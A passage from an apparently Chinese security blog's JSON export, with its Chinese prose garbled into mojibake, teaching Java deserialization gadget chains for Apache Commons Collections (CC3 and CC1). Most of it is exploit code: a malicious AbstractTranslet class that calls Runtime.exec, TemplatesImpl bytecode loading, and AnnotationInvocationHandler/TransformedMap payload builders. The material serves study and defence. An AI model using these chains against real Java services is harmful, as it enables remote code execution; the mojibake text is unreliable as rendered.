tmp.getDeclaredField(\"_tfactory\");\n        tfactoryfield.setAccessible(true);\n        tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());\n        templatesimpl.newTransformer();\n```\n\n \n\næ²¡æœ‰å¼¹å‡ºæ¥è®¡ç®—å™¨ï¼Œçˆ†äº†ç©ºæŒ‡é’ˆå¼‚å¸¸ï¼Œé€šè¿‡è°ƒè¯•å‘ç°åœ¨_classæˆåŠŸåŠ è½½ç±»åï¼Œæ˜¯è¿™é‡ŒæŠ›å‡ºäº†å¼‚å¸¸ï¼š\n\n```java\nfinal Class superClass = _class[i].getSuperclass();\nif (superClass.getName().equals(ABSTRACT_TRANSLET)) {\n                    _transletIndex = i;\n                }\n                else {\n                    _auxClasses.put(_class[i].getName(), _class[i]);\n                }\n            }\n\n            if (_transletIndex < 0) {\n                ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);\n                throw new TransformerConfigurationException(err.toString());\n            }\n```\n\nç¬¬ä¸€ä¸ªifæ£€æŸ¥_classçš„çˆ¶ç±»æ˜¯å¦å«`ABSTRACT_TRANSLET` ï¼Œå¦‚æœæ²¡æœ‰è¿›å…¥åˆ°ifé‡Œé¢é‚£ä¹ˆelseä¸­çš„_auxClassesä¸ºç©ºï¼Œå°±ä¼šæŠ›ç©ºæŒ‡é’ˆï¼Œå¹¶ä¸”ä¸‹é¢ç¬¬äºŒä¸ªifä¸­ä¹Ÿä¼šæŠ›å¼‚å¸¸ï¼Œä¸ºäº†é¿å…è¿™ä¸¤ä¸ªæŠ›å¼‚å¸¸çš„ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦å°†_classåŠ è½½çš„æ¶æ„ç±»ç»§æ‰¿åä¸º`ABSTRACT_TRANSLET` çš„çˆ¶ç±»ï¼š\n\n```java\nprivate static String ABSTRACT_TRANSLET\n        = \"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\";\n```\n\nä¿®æ”¹æ¶æ„ç±»ï¼Œç»§æ‰¿çš„çˆ¶ç±»ä¸­æœ‰ä¸¤ä¸ªæŠ½è±¡æ–¹æ³•éœ€è¦è¿›è¡Œé‡å†™ï¼š\n\n```java\npublic class Calc extends AbstractTranslet{\n    static{\n        try {\n            Runtime.getRuntime().exec(\"open -na Calculator\");\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n\n    }\n\n    @Override\n    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n\n    }\n\n    @Override\n    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n        \n    }\n}\n```\n\nç°åœ¨å°±å¯ä»¥å¼¹å‡ºè®¡ç®—å™¨äº†ï¼Œå¦‚æœä½ è¿™é‡Œæ²¡æœ‰å¼¹å‡ºæ¥ï¼Œçœ‹ä¸€ä¸‹importçš„åŒ…æ˜¯ä¸æ˜¯æœ‰é—®é¢˜ï¼Œ`TemplatesImpl`å’Œ`TransformerFactoryImpl`çš„è·¯å¾„ä¸€å®šè¦æ˜¯com.xxxï¼Œå¦‚æœæ˜¯org.xxxæ˜¯ä¸èƒ½ç”¨çš„ï¼š\n\n```java\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\n\npublic class CC3Test {\n    public static void main(String[] args) throws Exception{\n        TemplatesImpl templatesimpl = new TemplatesImpl();\n        Class tmp = templatesimpl.getClass();\n\n        Field nameField = tmp.getDeclaredField(\"_name\");\n        nameField.setAccessible(true);\n        nameField.set(templatesimpl,\"y1\");\n\n        Field bytecodesField = tmp.getDeclaredField(\"_bytecodes\");\n        bytecodesField.setAccessible(true);\n        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));\n        byte[][] codes = {code};\n        bytecodesField.set(templatesimpl,codes);\n\n        Field tfactoryfield = tmp.getDeclaredField(\"_tfactory\");\n        tfactoryfield.setAccessible(true);\n        tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());\n        templatesimpl.newTransformer();\n\n    }\n}\n```\n\nä¸‹é¢æˆ‘ä»¬è¦æƒ³åŠæ³•æ‰§è¡Œ`templatesimpl.newTransformer`ï¼Œè¿™é‡Œä¾æ—§æ˜¯ç”¨CC1ä¸­ç”¨åˆ°çš„`InvokerTransformer.transform`è¿›è¡Œä»£ç çš„æ‰§è¡Œï¼š\n\n```java\nTemplatesImpl templatesimpl = new TemplatesImpl();\n        Class tmp = templatesimpl.getClass();\n\n        Field nameField = tmp.getDeclaredField(\"_name\");\n        nameField.setAccessible(true);\n        nameField.set(templatesimpl,\"y1\");\n\n        Field bytecodesField = tmp.getDeclaredField(\"_bytecodes\");\n        bytecodesField.setAccessible(true);\n        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));\n        byte[][] codes = {code};\n        bytecodesField.set(templatesimpl,codes);\n\n        Field tfactoryfield = tmp.getDeclaredField(\"_tfactory\");\n        tfactoryfield.setAccessible(true);\n        tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());\n        ChainedTransformer ctf = new ChainedTransformer(new Transformer[]{\n            new ConstantTransformer(templatesimpl),\n            new InvokerTransformer(\"newTransformer\",null,null)\n        });\n        ctf.transform(1);\n```\n\nå‰©ä¸‹çš„æ‰¾`Chainedtransformer.transform` çš„è°ƒç”¨ç‚¹å°±å’ŒCC1åé¢ä¸€æ ·äº†ï¼Œç›´æ¥ç²˜è¿‡æ¥å°±æ˜¯ï¼š\n\n```java\npackage ysoserial.payloads.Test;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.lang.annotation.Target;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.util.HashMap;\nimport java.util.Map;\n\nimport static ysoserial.payloads.util.Test.util.Serialize.serialize;\nimport static ysoserial.payloads.util.Test.util.Unserialize.unserialize;\n\npublic class CC3Test {\n    public static void main(String[] args) throws Exception{\n        TemplatesImpl templatesimpl = new TemplatesImpl();\n        Class tmp = templatesimpl.getClass();\n\n        Field nameField = tmp.getDeclaredField(\"_name\");\n        nameField.setAccessible(true);\n        nameField.set(templatesimpl,\"y1\");\n\n        Field bytecodesField = tmp.getDeclaredField(\"_bytecodes\");\n        bytecodesField.setAccessible(true);\n        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));\n        byte[][] codes = {code};\n        bytecodesField.set(templatesimpl,codes);\n\n        Field tfactoryfield = tmp.getDeclaredField(\"_tfactory\");\n        tfactoryfield.setAccessible(true);\n        tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());\n        ChainedTransformer ctf = new ChainedTransformer(new Transformer[]{\n            new ConstantTransformer(templatesimpl),\n            new InvokerTransformer(\"newTransformer\",null,null)\n        });\n        HashMap map = new HashMap();\n        map.put(\"value\",\"v\");\n        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,ctf);\n        Class annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);\n        annotationInvocationHandlerconstructor.setAccessible(true);\n        Object o = annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);\n        serialize(o);\n        unserialize(\"ser.bin\");\n\n    }\n}\n```\n\nç›¸è¾ƒäºCC1æ¥è¯´ä¸€ä¸ªæ˜¯é€šè¿‡è°ƒç”¨Runtimeæ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä¸€ä¸ªæ˜¯é€šè¿‡åŠ¨æ€ç±»åŠ è½½è¿›è¡Œä»£ç æ‰§è¡Œï¼Œå¦‚æœè¿‡æ»¤äº†Runtimeæˆ‘ä»¬å°±å¯ä»¥å°è¯•ç”¨è¿™æ¡CC3\n\næ¥ä¸‹æ¥æˆ‘ä»¬åœ¨æ¥è¯´ysoserialä¸Šç”¨çš„å¦ä¸€æ¡è°ƒç”¨é“¾ï¼š\n\næˆ‘ä»¬å›åˆ°`newTransformer`ï¼Œåˆšæ‰è¯´çš„æ˜¯ç”¨CC1ååŠæ®µç›´æ¥è°ƒç”¨ï¼Œæˆ‘ä»¬æ¥ç€å‘ä¸‹æ‰¾è°ƒç”¨`newTransformer` çš„åœ°æ–¹ï¼Œæœ€ç»ˆé”å®šåœ¨äº†`com/sun/org/apache/xalan/internal/xsltc/trax/TrAXFilter.java` è¿™ä¸ªç±»ä¸Šï¼Œè¿™ä¸ªç±»æ²¡æœ‰ç»§æ‰¿serializeæ¥å£ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ²¡åŠæ³•é€šè¿‡åå°„æ¥ä¿®æ”¹å®ä¾‹ä¸­å±æ€§çš„å€¼ï¼Œä½†æ˜¯æˆ‘ä»¬æƒ³åˆ°å¯¹å±æ€§å€¼è¿›è¡Œåˆå§‹åŒ–çš„æ“ä½œä¸€èˆ¬åœ¨æ„é€ å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å®ƒçš„æ„é€ å‡½æ•°ï¼š\n\n```java\npublic TrAXFilter(Templates templates)  throws\n        TransformerConfigurationException\n    {\n        _templates = templates;\n        _transformer = (TransformerImpl) templates.newTransformer();\n        _transformerHandler = new TransformerHandlerImpl(_transformer);\n        _useServicesMechanism = _transformer.useServicesMechnism();\n    }\n```\n\næˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªæ„é€ å‡½æ•°æ¥æ§åˆ¶è¿™ä¸ªtemplatesçš„å€¼ï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥å°±æ˜¯è¦æ‰¾å¯ä»¥è°ƒç”¨è¿™ä¸ªæ„é€ å‡½æ•°çš„åœ°æ–¹ï¼Œysoserialä¸­ç»™å‡ºäº†`InstantiateTransformer` è¿™ä¸ªç±»ï¼Œé€šè¿‡å®ƒçš„æ„é€ å‡½æ•°å’Œtransformæ–¹æ³•å¯ä»¥è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„æŒ‡å®šå‚æ•°çš„æ„é€ å‡½æ•°ï¼š\n\n```java\n public InstantiateTransformer(Class[] paramTypes, Object[] args) {\n        this.iParamTypes = paramTypes;\n        this.iArgs = args;\n    }\n\npublic Object transform(Object input) {\n        try {\n            if (!(input instanceof Class)) {\n                throw new FunctorException(\"InstantiateTransformer: Input object was not an instanceof Class, it was a \" + (input == null ? \"null object\" : input.getClass().getName()));\n            } else {\n                Constructor con = ((Class)input).getConstructor(this.iParamTypes);\n                return con.newInstance(this.iArgs);\n            }\n```\n\nä¹Ÿå°±æ˜¯è¯´ä¸‹é¢ä¸¤è¡Œä»£ç å°±å¯ä»¥æ‰§è¡ŒnewTransformeräº†ï¼š\n\n```java\nInstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesimpl});\ninstantiateTransformer.transform(TrAXFilter.class);\n```\n\næœ€ç»ˆè¿˜æ˜¯ç”¨ChainedTransformeråŒ…è£¹èµ·æ¥æ‰§è¡Œï¼š\n\n```java\nTemplatesImpl templatesimpl = new TemplatesImpl();\n        Class tmp = templatesimpl.getClass();\n\n        Field nameField = tmp.getDeclaredField(\"_name\");\n        nameField.setAccessible(true);\n        nameField.set(templatesimpl,\"y1\");\n\n        Field bytecodesField = tmp.getDeclaredField(\"_bytecodes\");\n        bytecodesField.setAccessible(true);\n        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));\n        byte[][] codes = {code};\n        bytecodesField.set(templatesimpl,codes);\n\n        Field tfactoryfield = tmp.getDeclaredField(\"_tfactory\");\n        tfactoryfield.setAccessible(true);\n        tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());\n\n        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesimpl});\n        ChainedTransformer ctf = new ChainedTransformer(new Transformer[]{\n            new ConstantTransformer(TrAXFilter.class),\n            instantiateTransformer\n        });\n        HashMap map = new HashMap();\n        map.put(\"value\",\"v\");\n        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,ctf);\n        Class annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);\n        annotationInvocationHandlerconstructor.setAccessible(true);\n        Object o = annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);\n        serialize(o);\n        unserialize(\"ser.bin\");\n```\n\nå®Œæ•´çš„CC6è°ƒç”¨é“¾ï¼Œå½“InvokerTransformerè¢«banæ—¶å°±å¯ä»¥ç”¨è¿™æ¡é“¾ï¼š\n\n![image-20230206143659042](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143659042.png)\n","tags":["Javaååºåˆ—åŒ–"],"categories":["WebSec"]},{"title":"CommonsCollections1+6","url":"/2023/05/18/CommonsCollections1-6/","content":"# CommonsCollections1\n\n# ç¬¬ä¸€æ¡é“¾å­ï¼š\n\n## å‚è€ƒè§†é¢‘ï¼š\n\n[Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(ä¸€) CC1é“¾æ‰‹å†™EXP_å“”å“©å“”å“©_bilibili](https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0)\n\n## Javaç¯å¢ƒ\n\njdk8u65 ä¸‹è½½é“¾æ¥ï¼š[Java Archive Downloads - Java SE 8 (oracle.com)](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html)\n\n## **ä»€ä¹ˆæ˜¯CommonsCollections**\n\nCommonsï¼šApache Commonsæ˜¯Apacheè½¯ä»¶åŸºé‡‘ä¼šçš„é¡¹ç›®ï¼ŒCommonsçš„ç›®çš„æ˜¯æä¾›å¯é‡ç”¨çš„è§£å†³å„ç§å®é™…é—®é¢˜çš„Javaå¼€æºä»£ç ã€‚\n\nCommons Collectionsï¼šJavaä¸­æœ‰ä¸€ä¸ªCollectionsåŒ…ï¼Œå†…éƒ¨å°è£…äº†è®¸å¤šæ–¹æ³•ç”¨æ¥å¯¹é›†åˆè¿›è¡Œå¤„ç†ï¼ŒCommonsCollectionsåˆ™æ˜¯å¯¹Collectionsè¿›è¡Œäº†è¡¥å……ï¼Œå®Œå–„äº†æ›´å¤šå¯¹é›†åˆå¤„ç†çš„æ–¹æ³•ï¼Œå¤§å¤§æé«˜äº†æ€§èƒ½ã€‚\n\n## **CommonsCollections1**\n\né¦–å…ˆæˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªæ¥å£ï¼Œè¯¥æ¥å£å†…æœ‰ä¸€ä¸ªæ–¹æ³•ï¼š\n\n```java\npublic interface Transformer {\n\n    /**\n     * Transforms the input object (leaving it unchanged) into some output object.\n     *\n     * @param input  the object to be transformed, should be left unchanged\n     * @return a transformed object\n     * @throws ClassCastException (runtime) if the input is the wrong class\n     * @throws IllegalArgumentException (runtime) if the input is invalid\n     * @throws FunctorException (runtime) if the transform cannot be completed\n     */\n    public Object transform(Object input);\n\n}\n\n```\n\næˆ‘ä»¬åœ¨è¯¥æ¥å£çš„ä¼—å¤šå®ç°ç±»ä¸­é”å®šå¯ä»¥åˆ©ç”¨çš„ç±»`InvokerTransformer`ï¼Œå‘ç°`InvokerTransformer`çš„`transform`æ–¹æ³•åˆ©ç”¨åå°„å¯ä»¥å®ç°ä»»æ„æ–¹æ³•è°ƒç”¨ï¼Œæ‰§è¡Œè¿‡ç¨‹æ˜¯å…ˆä»transformæ–¹æ³•æ¥æ”¶ä¸€ä¸ªç±»ï¼Œé€šè¿‡åå°„è·å¾—è¿™ä¸ªç±»çš„classå¯¹è±¡ï¼Œå†é€šè¿‡æ„é€ å‡½æ•°æ¥å—æ–¹æ³•åå­—ï¼Œå‚æ•°ç±»å‹ï¼Œå‚æ•°åˆ—è¡¨ï¼Œå®ç°äº†ä»»æ„æ–¹æ³•è°ƒç”¨ï¼š\n\n```java\npublic InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {\n        super();\n        iMethodName = methodName;\n        iParamTypes = paramTypes;\n        iArgs = args;\n    }\n\npublic Object transform(Object input) {\n        if (input == null) {\n            return null;\n        }\n        try {\n            Class cls = input.getClass();\n            Method method = cls.getMethod(iMethodName, iParamTypes);\n            return method.invoke(input, iArgs);\n\n```\n\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™è¡Œä»£ç æ¥å¼¹è®¡ç®—å™¨ï¼Œå…¶å®ä¹Ÿå°±æ˜¯åˆ©ç”¨äº†`Invokertransformer`ä¸­è‡ªå¸¦çš„åå°„çœç•¥äº†åå°„çš„æ­¥éª¤ï¼š\n\n```java\n Runtime currentRuntime = Runtime.getRuntime();\n new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(currentRuntime);\n\n```\n\næˆ‘ä»¬æ¥ç€æ‰¾å¯åˆ©ç”¨çš„ç±»ï¼Œç†æƒ³æƒ…å†µä¸‹å¦‚æœæœ‰ä¸€ä¸ªç±»çš„`readObject`æ–¹æ³•ä¸­è°ƒç”¨äº†`Invokertransformer.transform`ï¼Œé‚£ä¹ˆè¿™ä¸ªç±»å°±æ˜¯æˆ‘ä»¬ååºåˆ—åŒ–çš„èµ·ç‚¹ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶æ²¡æœ‰æ‰¾åˆ°ä¸€ä¸ªè¿™æ ·çš„ç±»ï¼Œæ‰€ä»¥æ¥ç€å‘ä¸‹æ‰¾è°ƒç”¨äº†`Invokertransformer.transform`çš„å…¶ä»–ç±»ã€‚\n\nä¸‹ä¸€ä¸ªå¯åˆ©ç”¨çš„ç±»å°±æ˜¯`Commons Collections`ä¸­çš„`TransformedMap`\n\nç±»ï¼š\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211221931757.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211221931757.png)\n\næˆ‘ä»¬ä¸»è¦çœ‹`TransformedMap`çš„æ„é€ å‡½æ•°å’Œ`decorate`æ–¹æ³•ï¼š\n\n```java\n    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {\n        super(map);\n        this.keyTransformer = keyTransformer;\n        this.valueTransformer = valueTransformer;\n    }\n\n   public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {\n        return new TransformedMap(map, keyTransformer, valueTransformer);\n    }\n\n```\n\n`TransformedMap`çš„æ„é€ æ–¹æ³•ä¸ºprotectedï¼Œå› æ­¤æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³•`decorate`æ¥ä½¿ç”¨å®ƒçš„æ„é€ æ–¹æ³•ï¼Œ`decorate`æ¥å—ä¸€ä¸ªmapï¼Œä¸¤ä¸ªTransfoemerï¼Œå¹¶å¯¹è¿™ä¸¤ä¸ªTransformeråšäº†ä¸€ä¸ªâ€œè£…é¥°â€æ“ä½œã€‚\n\n`TransformedMap`ä¸­æ‰¾åˆ°`checkSetValue`è°ƒç”¨äº†`Invokertransformer.transform`ï¼š\n\n```java\nprotected Object checkSetValue(Object value) {\n        return valueTransformer.transform(value);\n    }\n\n```\n\næˆ‘ä»¬å°†ä¸Šé¢å¼¹è®¡ç®—å™¨çš„payloadæ¯”å¯¹ä¸€ä¸‹ï¼š\n\n```java\nnew InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(currentRuntime);\n\n```\n\nä¹Ÿå°±æ˜¯è¯´å¦‚æœ`checkSetValue`ä¸­ï¼Œæˆ‘ä»¬å°†`valueTransformer`æ›¿æ¢æˆ`InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})`ï¼Œå†å°†`transform`çš„å‚æ•°æ›¿æ¢æˆRuntimeå¯¹è±¡ï¼Œå°±å¯ä»¥æ›¿ä»£ä¸Šé¢çš„å†™æ³•ã€‚æƒ³è¦æ›¿ä»£`valueTransformer`å¯ä»¥é€šè¿‡è°ƒç”¨`TransformedMap.decorate`å°†`InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})`èµ‹å€¼ç»™`valueTransformer`ï¼Œä¿®æ”¹payloadå¦‚ä¸‹ï¼š\n\n```java\nInvokerTransformer invokerTransformer =  new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"});\n        HashMap map = new HashMap();\n        TransformedMap.decorate(map,null,invokerTransformer);\n\n```\n\næˆ‘ä»¬å†æ¥çœ‹æ€ä¹ˆè®©valueå¯æ§ï¼Œé¦–å…ˆè¦æ‰¾è°ƒç”¨`checkSetValue`çš„æ–¹æ³•ï¼š\n\næˆ‘ä»¬é”å®šæŠ½è±¡ç±»`AbstractInputCheckedMapDecorator.MapEntry`ï¼ŒæŸ¥çœ‹å®ƒçš„`setValue`æ–¹æ³•ï¼Œå¹¶ä¸”`TransformedMap`æ˜¯è¯¥æŠ½è±¡ç±»çš„å®ç°ç±»ï¼š\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211241940144.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211241940144.png)\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211231903967.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211231903967.png)\n\n```java\n static class MapEntry extends AbstractMapEntryDecorator {\n\n        /** The parent map */\n        private final AbstractInputCheckedMapDecorator parent;\n\n        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {\n            super(entry);\n            this.parent = parent;\n        }\n\n        public Object setValue(Object value) {\n            value = parent.checkSetValue(value);\n            return entry.setValue(value);\n        }\n    }\n\n```\n\næˆ‘ä»¬å‘ç°å¯ä»¥é€šè¿‡è°ƒç”¨`setValue(currentRuntime)`æ–¹æ³•æ¥è§¦å‘å…¶ä¸­çš„`checkSetvalue`ï¼Œæˆ‘ä»¬ç°åœ¨éœ€è¦ä¸€ä¸ªentryæ¥è°ƒç”¨å®ƒçš„setValueæ–¹æ³•ï¼Œæ‰€ä»¥è¿™é‡Œéå†ä¸€ä¸ªMapï¼Œè·å–å®ƒçš„entryï¼š\n\n```java\n map.put(\"k\",\"v\");\n for (Map.Entry entry:transformedMap.entrySet())\n        {\n                entry.setValue(currentRuntime);\n        }\n\n```\n\npayloadæ­¤æ—¶ä¿®æ”¹ä¸ºï¼š\n\n```java\n\t    Runtime currentRuntime = Runtime.getRuntime();\n        InvokerTransformer invokerTransformer =  new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"});\n        HashMap map = new HashMap();\n        map.put(\"k\",\"v\");\t\t\t//éšä¾¿ç»™mapå­˜ä¸€å¯¹k-v å¦åˆ™éå†æ—¶mapä¸ºç©º æ‹¿ä¸åˆ°entry\n        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,invokerTransformer);\n        for (Map.Entry entry:transformedMap.entrySet()) //entrySetå¯ä»¥å°†mapä¸­çš„é”®å€¼å¯¹ä»¥setå‚¨å­˜èµ·æ¥\n        {\n                entry.setValue(currentRuntime);\n        }\n\n```\n\næˆ‘ä»¬æ¥ç€æ‰¾setValueåœ¨å…¶ä»–ä½ç½®çš„è°ƒç”¨\n\n---\n\nè¿™é‡Œæˆ‘ä»¬éœ€è¦å¯¹ç¯å¢ƒåšä¸€ç‚¹å°é…ç½®ï¼Œç”±äºä¸‹ä¸€ä¸ªå¯åˆ©ç”¨ç±»`AnnotationInvocationHandler`æ˜¯ç›´æ¥åç¼–è¯‘å‡ºæ¥çš„ï¼Œåœ¨æŸ¥æ‰¾ç”¨æ³•æ—¶æ‰¾ä¸åˆ°è¿™ä¸ªç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å°†`AnnotationInvocationHandler`çš„javaæ–‡ä»¶æ·»åŠ åˆ°jdkä¸­\n\n- æˆ‘ä»¬å…ˆåœ¨openjdkæ‰¾åˆ°æœ‰æ¼æ´çš„javaç‰ˆæœ¬ï¼š[jdk8u/jdk8u/jdk: af660750b2f4 (java.net)](http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4)\n- åœ¨ä¸‹è½½å¥½çš„jdkä¸­æ‰¾åˆ°sunåŒ… è·¯å¾„ä¸º`jdk-af660750b2f4\\\\jdk-af660750b2f4\\\\src\\\\share\\\\classes`\n- æˆ‘ä»¬æ‰¾åˆ°ysoserialä½¿ç”¨çš„jdk8u65çš„ç›®å½•ï¼Œè¿™é‡Œä¸€èˆ¬åˆ†ä¸¤ä¸ªæƒ…å†µ\n    - ç›®å½•ä¸‹æœ‰src.zipï¼Œåˆ©ç”¨è§£å‹å·¥å…·è§£å‹åå°†ä¸Šä¸€æ­¥æ‰¾åˆ°çš„sunåŒ…copyä¸€ä»½åˆ°srcé‡Œ\n    - ç›®å½•ä¸‹æ²¡æœ‰src.zipï¼Œæˆ‘ä»¬å…ˆåœ¨`jdk1.8 u65\\\\`ä¸‹æ–°å»ºä¸€ä¸ªsrcæ–‡ä»¶å¤¹ï¼Œå†åœ¨`jdk1.8 u65\\\\jre\\\\lib`ä¸‹æ‰¾åˆ°`rt.jar`ï¼Œæ³¨æ„è¿™é‡Œä¸è¦ç”¨java -jarè¿›è¡Œè§£å‹ï¼Œç›´æ¥ç”¨7zipç­‰è§£å‹å·¥å…·è§£å‹å³å¯ï¼Œè§£å‹åå°†é‡Œé¢çš„æ‰€æœ‰ä¸œè¥¿æ”¾åœ¨`jdk1.8 u65\\\\src`ä¸‹ï¼Œå†å°†ä¸Šä¸€æ­¥çš„sunåŒ…copyåˆ°srcä¸­\n- æœ€åå†åœ¨ideaä¸­å·¦ä¸Šè§’ æ–‡ä»¶ - é¡¹ç›®ç»“æ„ï¼Œåœ¨SDKçš„æºè·¯å¾„ï¼ˆsource pathï¼‰ä¸­æ·»åŠ srcæ–‡ä»¶å¤¹å³å¯\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211241940524.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211241940524.png)\n\n---\n\næŸ¥æ‰¾setValueçš„è°ƒç”¨ï¼Œå‘ç°åœ¨`AnnotationInvocationHandler`çš„readObjectä¸­è°ƒç”¨äº†setValueï¼Œè·Ÿè¿›æŸ¥çœ‹ï¼š\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211241940172.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211241940172.png)\n\nreadObjectä¸­æœ‰ä¸€ä¸ªéå†mapçš„åŠŸèƒ½ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç°åœ¨å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªåŠŸèƒ½ä»£æ›¿æˆ‘ä»¬ä¸Šé¢æ‰‹åŠ¨éå†mapæ‹¿entryçš„æ“ä½œäº†ï¼š\n\n```java\n    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {\n        Class<?>[] superInterfaces = type.getInterfaces();\n        if (!type.isAnnotation() ||\n            superInterfaces.length != 1 ||\n            superInterfaces[0] != java.lang.annotation.Annotation.class)\n            throw new AnnotationFormatError(\"Attempt to create proxy for a non-annotation type.\");\n        this.type = type;\n        this.memberValues = memberValues;\n    }\n\nprivate void readObject(java.io.ObjectInputStream s)\n        throws java.io.IOException, ClassNotFoundException {\n        s.defaultReadObject();\n\n        // Check to make sure that types have not evolved incompatibly\n\n        AnnotationType annotationType = null;\n        try {\n            annotationType = AnnotationType.getInstance(type);\n        } catch(IllegalArgumentException e) {\n            // Class is no longer an annotation type; time to punch out\n            throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\");\n        }\n\n        Map<String, Class<?>> memberTypes = annotationType.memberTypes();\n\n        // If there are annotation members without values, that\n        // situation is handled by the invoke method.\n\n        //membersValueæ˜¯æ„é€ å‡½æ•°æ¥æ”¶åˆ°çš„ä¸€ä¸ªMap\n        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {\n            String name = memberValue.getKey();\n            Class<?> memberType = memberTypes.get(name);\n            if (memberType != null) {  // i.e. member still exists\n                Object value = memberValue.getValue();\n                if (!(memberType.isInstance(value) ||\n                      value instanceof ExceptionProxy)) {\n                    memberValue.setValue(\n                        new AnnotationTypeMismatchExceptionProxy(\n                            value.getClass() + \"[\" + value + \"]\").setMember(\n                                annotationType.members().get(name)));\n                }\n            }\n        }\n    }\n\n```\n\npayloadä¿®æ”¹ä¸ºï¼š\n\n```java\n Runtime currentRuntime = Runtime.getRuntime();\n        InvokerTransformer invokerTransformer =  new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"});\n        HashMap map = new HashMap();\n        map.put(\"k\",\"v\");\n        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,invokerTransformer);\n        Class annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");//AnnotationInvocationHandlerç±»ä¸ºdefault 